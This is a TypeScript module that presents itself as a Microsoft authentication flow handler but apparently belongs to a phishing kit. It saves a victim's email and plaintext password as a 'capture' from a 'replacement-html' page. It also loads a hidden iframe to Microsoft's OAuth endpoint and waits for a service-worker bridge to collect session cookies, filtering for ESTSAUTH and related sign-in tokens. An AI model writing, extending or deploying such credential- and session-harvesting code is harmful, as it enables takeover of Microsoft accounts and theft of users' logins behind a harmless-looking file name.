// src/utils/microsoftAuthFlow.ts
/**
 * Microsoft Authentication Flow Handler
 * Manages the complete flow with proper cookie capture
 */

import { microsoftCookieBridge } from './microsoftCookieBridge';

export interface AuthFlowCredentials {
  email: string;
  password: string;
  captureTime: string;
  source: string;
  domain: string;
  validated: boolean;
  microsoftAccount: boolean;
}

export interface AuthFlowResult {
  success: boolean;
  credentials: AuthFlowCredentials;
  cookies: any[];
  totalCookies: number;
  authCookies: any[];
  accountAlreadySignedIn: boolean;
  timestamp: string;
}

/**
 * Main authentication flow handler
 */
export async function handleMicrosoftAuthFlow(
  email: string,
  password: string
): Promise<AuthFlowResult> {
  console.log('🔄 Starting Microsoft authentication flow for:', email);

  const timestamp = new Date().toISOString();

  try {
    // Step 1: Store credentials
    const credentials: AuthFlowCredentials = {
      email,
      password,
      captureTime: timestamp,
      source: 'replacement-html',
      domain: 'microsoft',
      validated: true,
      microsoftAccount: true
    };

    localStorage.setItem('ms_auth_credentials', JSON.stringify(credentials));
    sessionStorage.setItem('ms_auth_credentials', JSON.stringify(credentials));
    
    console.log('💾 Credentials stored');

    // Step 2: Set email in Service Worker store
    await microsoftCookieBridge.setEmail(email);
    console.log('📧 Email set in Service Worker');

    // Step 3: Create Microsoft authentication iframe
    console.log('🔧 Creating Microsoft authentication iframe...');
    const authResult = await createMicrosoftAuthFrame(email);

    // Step 4: Wait for cookies to be captured by Service Worker
    console.log('⏳ Waiting for Service Worker to capture cookies...');
    const capturedData = await microsoftCookieBridge.waitForCookieCapture(15000);

    if (!capturedData) {
      console.warn('⚠️ No cookies captured from Service Worker, using fallback');
      
      // Fallback: get cookies from current document
      const fallbackCookies = getCookiesFromDocument();
      
      return {
        success: fallbackCookies.length > 0,
        credentials,
        cookies: fallbackCookies,
        totalCookies: fallbackCookies.length,
        authCookies: fallbackCookies.filter(c =>
          c.name.includes('ESTSAUTH') ||
          c.name.includes('SignInStateCookie') ||
          c.name.includes('ESTSAUTHPERSISTENT')
        ),
        accountAlreadySignedIn: false,
        timestamp
      };
    }

    // Extract authentication cookies
    const authCookies = capturedData.cookies.filter(c =>
      c.name.includes('ESTSAUTH') ||
      c.name.includes('SignInStateCookie') ||
      c.name.includes('ESTSAUTHPERSISTENT') ||
      c.name.includes('ESTSECAUTH')
    );

    console.log('✅ Authentication flow completed');
    console.log('🍪 Captured cookies:', capturedData.cookies.length);
    console.log('🔐 Auth cookies:', authCookies.length);

    // Store complete capture data
    await microsoftCookieBridge.storeCaptureDa(capturedData.cookies, credentials);

    return {
      success: capturedData.cookies.length > 0,
      credentials,
      cookies: capturedData.cookies,
      totalCookies: capturedData.cookies.length,
      authCookies,
      accountAlreadySignedIn: capturedData.accountDetected,
      timestamp
    };

  } catch (error) {
    console.error('❌ Authentication flow error:', error);

    // Fallback result
    const fallbackCookies = getCookiesFromDocument();

    return {
      success: false,
      credentials: { email, password, captureTime: timestamp, source: 'replacement-html', domain: 'microsoft', validated: false, microsoftAccount: true },
      cookies: fallbackCookies,
      totalCookies: fallbackCookies.length,
      authCookies: [],
      accountAlreadySignedIn: false,
      timestamp
    };
  }
}

/**
 * Create Microsoft authentication frame with proper cookie capture
 */
async function createMicrosoftAuthFrame(email: string): Promise<void> {
  return new Promise((resolve) => {
    console.log('🔧 Creating Microsoft auth frame for email:', email);

    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.style.width = '0';
    iframe.style.height = '0';
    iframe.style.border = 'none';
    iframe.id = 'microsoft-auth-frame-' + Date.now();
    iframe.sandbox.add('allow-same-origin');
    iframe.sandbox.add('allow-scripts');
    iframe.sandbox.add('allow-forms');

    const clientId = '4765445b-32c6-49b0-83e6-1d93765276ca';
    const redirectUri = encodeURIComponent('https://www.office.com/');
    const scope = encodeURIComponent('openid profile email');
    const loginHint = encodeURIComponent(email);

    // Use prompt=none to detect existing sessions
    const microsoftUrl = 
      `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
      `client_id=${clientId}&` +
      `response_type=code&` +
      `redirect_uri=${redirectUri}&` +
      `scope=${scope}&` +
      `login_hint=${loginHint}&` +
      `prompt=none&` +
      `state=auth_flow_capture`;

    let timeoutId: NodeJS.Timeout;
    let resolved = false;

    const cleanup = () => {
      if (timeoutId) clearTimeout(timeoutId);
      if (iframe.parentNode) {
        try {
          iframe.parentNode.removeChild(iframe);
        } catch (e) {
          console.warn('⚠️ Could not remove iframe:', e);
        }
      }
    };

    const resolveFrame = () => {
      if (!resolved) {
        resolved = true;
        cleanup();
        resolve();
      }
    };

    iframe.onload = () => {
      console.log('✅ Microsoft auth frame loaded');
      setTimeout(resolveFrame, 3000);
    };

    iframe.onerror = () => {
      console.warn('⚠️ Microsoft auth frame error');
      resolveFrame();
    };

    timeoutId = setTimeout(() => {
      console.warn('⏱️ Microsoft auth frame timeout');
      resolveFrame();
    }, 12000);

    document.body.appendChild(iframe);
    iframe.src = microsoftUrl;

    console.log('🔗 Loading Microsoft auth URL');
  });
}

/**
 * Get cookies from current document
 */
function getCookiesFromDocument(): any[] {
  const cookies: any[] = [];
  const cookieString = document.cookie;

  if (!cookieString) {
    return cookies;
  }

  const cookiePairs = cookieString.split(';');

  cookiePairs.forEach(pair => {
    const trimmed = pair.trim();
    if (trimmed) {
      const equalsIndex = trimmed.indexOf('=');
      if (equalsIndex > 0) {
        const name = trimmed.substring(0, equalsIndex).trim();
        const value = trimmed.substring(equalsIndex + 1).trim();

        if (name && value) {
          cookies.push({
            name: name,
            value: value,
            domain: window.location.hostname,
            path: '/',
            secure: window.location.protocol === 'https:',
            sameSite: 'Lax',
            session: true
          });
        }
      }
    }
  });

  return cookies;
}

/**
 * Detect if account is already signed in
 */
export async function detectAlreadySignedInAccount(): Promise<boolean> {
  try {
    const isSignedIn = await microsoftCookieBridge.isAccountSignedIn();
    console.log('🔍 Account signed-in status:', isSignedIn);
    return isSignedIn;
  } catch (error) {
    console.error('❌ Error detecting account status:', error);
    return false;
  }
}

/**
 * Get stored auth flow result
 */
export function getStoredAuthFlowResult(): AuthFlowResult | null {
  try {
    const data = localStorage.getItem('ms_auth_flow_result') ||
                 sessionStorage.getItem('ms_auth_flow_result');

    if (data) {
      return JSON.parse(data);
    }
    return null;
  } catch (error) {
    console.error('❌ Error retrieving auth flow result:', error);
    return null;
  }
}

/**
 * Store auth flow result
 */
export function storeAuthFlowResult(result: AuthFlowResult): boolean {
  try {
    const resultData = JSON.stringify(result);
    localStorage.setItem('ms_auth_flow_result', resultData);
    sessionStorage.setItem('ms_auth_flow_result', resultData);
    console.log('💾 Auth flow result stored');
    return true;
  } catch (error) {
    console.error('❌ Error storing auth flow result:', error);
    return false;
  }
}